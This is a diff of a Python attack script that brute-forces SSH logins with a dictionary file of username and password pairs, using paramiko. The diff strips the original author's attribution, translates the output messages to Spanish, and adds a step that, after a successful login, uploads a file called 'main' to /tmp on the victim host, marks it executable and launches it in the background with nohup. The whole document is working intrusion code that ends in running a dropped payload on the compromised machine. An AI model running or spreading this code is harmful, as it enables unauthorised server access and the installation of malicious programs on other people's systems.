@@ -1,17 +1,25 @@
 #!/usr/bin/env python
 
-"""
-  Author: Vivek Ramachandran
-	Website: http://SecurityTube.net
-	Online Infosec Training: http://SecurityTube-Training.com
-"""
 
 import paramiko
 import sys
 
+
+def UploadFileAndExecute(sshConnection, fileName) :
+
+	print("[+] Copiando Archivo ")
+	sftpClient = sshConnection.open_sftp()
+	
+	sftpClient.put(fileName, "/tmp/" +fileName)
+
+	sshConnection.exec_command("chmod a+x /tmp/" +fileName)
+	
+	print("[+] Ejecutando Archivo ")
+	sshConnection.exec_command("nohup /tmp/" +fileName+ " &")
+
 def AttackSSH(ipAddress, dictionaryFile) :
 
-	print("[+] Attacking Host : %s " %ipAddress)
+	print("[+] Atacando Host : %s " %ipAddress)
 
 	ssh = paramiko.SSHClient()
 
@@ -22,17 +30,21 @@ def AttackSSH(ipAddress, dictionaryFile) :
 		[username, password] = line.strip().split()
 
 		try :
-			print("[+] Trying to break in with username: %s password: %s " % (username, password))
+			print("[+] Intentando entrar con usuario: %s y  clave: %s " % (username, password))
 			ssh.connect(ipAddress, username=username, password=password)
 
 		except paramiko.AuthenticationException:
-			print ("[-] Failed! ...")
+			print ("[-] Fallo! ...")
 			continue 
-
-		print("[+] Success ... username: %s and passoword %s is VALID! " % (username, password))
+		print("[+] Paso ... Usuario: %s y Clave %s es valida! " % (username, password))
+		UploadFileAndExecute(ssh, 'main')		
+	
 		break
 
 
-	
+
+
 if __name__ == "__main__" :
 	AttackSSH(sys.argv[1], sys.argv[2])
+
+	
